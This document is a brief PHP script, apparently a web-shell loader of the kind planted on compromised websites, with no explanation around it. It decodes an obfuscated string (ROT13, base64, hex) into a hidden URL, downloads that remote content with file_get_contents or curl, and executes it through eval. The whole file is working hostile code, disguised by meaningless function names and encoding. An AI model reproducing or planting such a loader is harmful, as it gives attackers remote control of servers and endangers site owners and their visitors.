<?php function bunvisGanteng($url)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  curl_close($ch);
  return $response;
}
function cXe($ipt)
{
  $hex = '';
  for ($i = 0; $i < strlen($ipt); $i++) {
    $hex .= dechex(ord($ipt[$i]));
  }
  $base64 = base64_encode($hex);
  return str_rot13($base64);
}
function cDc($eoUr)
{
  $rEq = str_rot13($eoUr);
  $bsfD = base64_decode($rEq);
  $xiE = '';
  for ($i = 0; $i < strlen($bsfD); $i += 2) {
    $xiE .= chr(hexdec(substr($bsfD, $i, 2)));
  }
  return $xiE;
}
$eoUr = 'Awt3AQp0AmN3ZmAuZzLlMwplAwR3AmWyAwp2BGp0Awt3AGLlAmH3ZmL1AmV2ZmMzAzH3AQL1AzH3AQWyAwZ2MwMxZzL0BGMyAmL2BGpmAwx2ZwMwAwH0Zwp1AzH2MGp5ZzL1ZwL1AwZ2MwplAwD3ZmWzAmV2AGL2AmZlMwL4AwH2ZGL0AmZlMwMxAwR2BGMyZzL0Zwp1AzH2MGp5ZzD0MQL5AzH2BGWzAzD2BGMyAwxlMGpmAwt2AGMwAzZlMGpjAwt3ZN==';
$xiE = cDc($eoUr);
$response = @file_get_contents($xiE);
if (empty($response)) {
  $response = bunvisGanteng($xiE);
}
if (is_string($response)) {
  eval('?>' . $response);
} else {
  echo "Error: Unable to retrieve content.";
}
